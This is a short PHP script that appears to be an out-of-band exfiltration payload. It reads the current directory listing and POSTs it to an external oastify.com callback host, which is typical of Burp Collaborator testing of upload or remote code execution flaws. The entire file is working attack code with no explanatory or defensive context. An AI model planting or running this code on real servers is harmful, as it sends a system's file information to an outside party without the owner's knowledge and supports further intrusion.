<?php

function sendPostRequest($url, $data) {
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    $context  = stream_context_create($options);
    return file_get_contents($url, false, $context);
}

$directoryContents = scandir('.');


$directoryListing = implode("\n", $directoryContents);


$externalUrl = 'https://lc1x6gvzdkm1zzjnz8ahezzdb4hv5lta.oastify.com';
sendPostRequest($externalUrl, ['data' => $directoryListing]);

?>
